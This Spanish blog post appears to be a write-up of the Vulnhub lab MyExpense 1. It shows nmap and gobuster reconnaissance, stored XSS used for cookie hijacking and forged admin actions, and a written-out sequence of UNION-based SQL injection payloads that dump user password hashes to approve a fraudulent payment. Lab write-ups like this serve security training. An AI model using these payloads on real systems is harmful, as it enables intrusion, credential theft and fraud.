---

layout: post
image: /assets/DocumentacionHacking/vulnhub.jpg
title: MyExpense 1 - Vulnhub
date: 25-03-2025
categories: [Write ups]
tags: [SQL injection, cookie hijacking, XSS]
excerpt: "En esta sección estaremos resolviendo la máquina que nos ofrece Vulnhub."
---

![img-description](/assets/DocumentacionHacking/vulnhub.jpg)

En esta sección estaremos resolviendo la máquina MyExpense: 1 que nos ofrece la plataforma de Vulnhub. En esta sección haremos uso de técnicas de ataque como XSS, SQL injection, cookie hijacking y poco más.

---

## Escenario

Eres "Samuel Lamotte" y acabas de ser despedido por tu empresa "Furtura Business Informatique". Desafortunadamente, debido a tu salida apresurada, no tuviste tiempo para validar tu informe de gastos para tu último viaje de negocios, que todavía asciende a 750 euros correspondientes a un vuelo de regreso a tu último cliente.

Temiendo que tu antiguo empleador pueda no querer reembolsarte por este informe de gastos, decides hackear la aplicación interna llamada "MyExpense" para gestionar los informes de gastos de los empleados.

Así que estás en tu coche, en el aparcamiento de la empresa y conectado al Wi-Fi interno (la clave todavía no ha sido cambiada después de tu salida). La aplicación está protegida por autenticación de nombre de usuario/contraseña y esperas que el administrador aún no haya modificado o eliminado tu acceso.

Tus credenciales eran: ```**samuel/fzghn4lw**```

---

### Comenzando...

Primero que nada, lo que hacemos es ver si la máquina tiene conectividad. Para esto mandamos un ping a la máquina víctima.
![img-description](/assets/DocumentacionHacking/XSS1.png)

Ya que vimos que la máquina responde, procedemos con la fase de reconocimiento. En esta lanzamos el siguiente comando:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.7 -oG allPorts
```

![img-description](/assets/DocumentacionHacking/XSS2.png)

Procedemos a ver los puertos que están abiertos en la máquina mediante la captura que tomamos.
![img-description](/assets/DocumentacionHacking/XSS3.png)

Como podemos ver, tenemos varios puertos abiertos. Ya que los tenemos, procederemos a lanzar una serie de scripts básicos.

Para ello hacemos uso del siguiente comando:

```bash 
nmap -sC -sV -p80,35087,36597,49507,5279 192.168.100.7 -oN targeted 
```

Como podemos ver, nos detecta que tenemos el puerto 80 abierto, por lo cual nos hace suponer que existe una página web corriendo.
![img-description](/assets/DocumentacionHacking/XSS4.png)

Y en efecto...
![img-description](/assets/DocumentacionHacking/XSS5.png)

Explorando la página no nos muestra mucho, por lo cual necesitamos ver cómo esta página está operando por detrás. Para esto usaremos el siguiente comando con ayuda de Gobuster para ver subdominios ocultos:

```bash 
gobuster dir -u http://192.168.100.7 -w /opt/herramientas/SecList/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

Nos muestra un subdirectorio admin y, si navegamos, no nos deja acceder.
![img-description](/assets/DocumentacionHacking/XSS6.png)

Para ello tendremos que ver cómo esta página opera por detrás. Para esto vemos en el Wappalyzer qué tecnología está implementada en la web. Vemos que nos dice que es PHP, entonces procedemos a ver extensiones PHP en este subdominio.

![img-description](/assets/DocumentacionHacking/XSS7.png)

Y en efecto encontramos algo. Procedemos a navegar a ese subdominio y nos da el siguiente resultado: 

![img-description](/assets/DocumentacionHacking/XSS8.png)

![img-description](/assets/DocumentacionHacking/XSS9.png)

Si intentamos acceder con las credenciales del usuario, no nos da acceso.

Intentamos crear un usuario nuevo y vemos que tiene la función de sign up desactivada. Cambiamos eso rápidamente desde la terminal web.
![img-description](/assets/DocumentacionHacking/XSS10.png)

Y ya nos deja registrar un usuario, pero esto no es de mucha ayuda. De aquí parte el intento de colar XSS por el formulario.
![img-description](/assets/DocumentacionHacking/XSS11.png)

Realizamos una prueba básica para ver si el ataque XSS surte efecto y nos damos cuenta de que, en efecto, es vulnerable a XSS.
![img-description](/assets/DocumentacionHacking/XSS12.png)

![img-description](/assets/DocumentacionHacking/XSS13.png)

Ya que vimos que podemos colar XSS, podemos hacer uso de un script que creamos para solicitar por GET la cookie de algún usuario que esté en la web, para poder hacer uso de su cookie ```**cookie hijacking**```.

![img-description](/assets/DocumentacionHacking/XSS15.png)

Levantamos un servidor para estar en escucha.

![img-description](/assets/DocumentacionHacking/XSS14.png)

Y en efecto, alguien que está navegando, sin darse cuenta, nos dio su cookie.
![img-description](/assets/DocumentacionHacking/XSS16.png)

La inyectamos en el navegador y vemos si podemos entrar con sus credenciales.
![img-description](/assets/DocumentacionHacking/XSS17.png)

Como podemos ver, el ataque no surtió efecto. Para ello cambiaremos el enfoque a que el usuario, cuando navegue en la web, solicite por método GET la activación del usuario, sin que él se dé cuenta.
![img-description](/assets/DocumentacionHacking/XSS18.png)

Como podemos ver, el usuario está inactivo.
![img-description](/assets/DocumentacionHacking/XSS20.png)

Y si levantamos este script, el cual es el mismo que colamos en la petición del cookie, y colocamos el servidor en escucha...

![img-description](/assets/DocumentacionHacking/XSS19.png)

Después de esperar un poco, en efecto nos han activado la cuenta.
![img-description](/assets/DocumentacionHacking/XSS21.png)

Accedemos con nuestras credenciales ya que nuestra cuenta está activada.
![img-description](/assets/DocumentacionHacking/XSS22.png)

¡Y estamos dentro!
![img-description](/assets/DocumentacionHacking/XSS23.png)

Como podemos ver, hay una solicitud de cobro que no pudimos realizar porque nos sacaron del sistema.
![img-description](/assets/DocumentacionHacking/XSS24.png)

Por lo tanto, colaremos un nuevo XSS en el formulario, pero ahora para robar la cookie del superior.
![img-description](/assets/DocumentacionHacking/XSS25.png)

![img-description](/assets/DocumentacionHacking/XSS26.png)

Hacemos la inyección de la nueva cookie.
![img-description](/assets/DocumentacionHacking/XSS27.png)

Y en efecto resultó correcto, ya accedimos como el usuario superior.
![img-description](/assets/DocumentacionHacking/XSS28.png)

Procedemos a aceptar la solicitud de pago.
![img-description](/assets/DocumentacionHacking/XSS29.png)

Pero como podemos ver, en la jerarquía hay alguien más que necesita concedernos la solicitud.

![img-description](/assets/DocumentacionHacking/XSS30.png)

Para eso necesitamos ver qué password tiene ese usuario. Vemos si la página es vulnerable a SQL Injection y, en efecto, sí.
![img-description](/assets/DocumentacionHacking/XSS31.png)

Buscamos qué columna es inyectable con el siguiente comando:

```bash 
union select 1,1-- -
```

Y después inyectamos:

```bash 
union select 1,user()-- -
```

![img-description](/assets/DocumentacionHacking/XSS32.png)

Buscamos las bases de datos presentes en la página web:

```bash 
union select 1,schema_name from information_schema.schemata-- -
```

![img-description](/assets/DocumentacionHacking/XSS33.png)

Ahora buscamos por tablas:

```bash 
union select 1,table_name from information_schema.tables where table_schema='myexpensive'-- -
```

![img-description](/assets/DocumentacionHacking/XSS34.png)

Ahora buscamos la columna en la tabla de la BD:

```bash 
union select 1,column_name from information_schema.columns where table_schema='myexpensive' and table_name='user'-- -
```

![img-description](/assets/DocumentacionHacking/XSS35.png)

Ya que encontramos los campos que necesitábamos, filtramos:

```bash 
union select 1, group_concat(username,password) from user-- -
```

![img-description](/assets/DocumentacionHacking/XSS36.png)

Hacemos un filtro para obtener el password del usuario al que necesitamos acceder.
![img-description](/assets/DocumentacionHacking/XSS37.png)

Como está cifrado, navegamos a la web ```**Hashes.com**```.
![img-description](/assets/DocumentacionHacking/XSS38.png)

Accedemos con sus credenciales y listo, ¡estamos dentro!
![img-description](/assets/DocumentacionHacking/XSS39.png)

Aceptamos la solicitud de envío de pago.
![img-description](/assets/DocumentacionHacking/XSS40.png)

Y listo, ya en nuestro perfil vemos que el pago ya se nos envió, y nos podemos ir a casa con nuestro pago.

#### Fin de la resolución de esta máquina ####
![img-description](/assets/DocumentacionHacking/XSS41.png)
